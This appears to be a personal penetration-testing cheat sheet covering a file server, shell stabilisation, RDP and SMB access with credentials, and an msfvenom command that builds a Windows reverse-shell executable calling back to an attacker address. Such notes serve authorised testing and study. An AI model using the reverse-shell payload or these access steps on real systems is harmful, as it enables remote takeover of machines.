Host http server
	`python3 -m http.server`

Normalizing a shell
	`python3 -c 'import pty;pty.spawn("/bin/bash")'`
	`export TERM=xterm`
	`CTRL + Z`
	`stty raw -echo && fg`

RDP with xfreerdp
	`xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[IP_ADDRESS]`

List Shares on SMB
	`smbclient -L $IP`

Connect to a valid share with username + password
	`smbclient //<target>/<share$> -U username%password`

Generate Windows Reverse Shell Payload
	`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.200 LPORT=1337 -f exe > reverse.exe`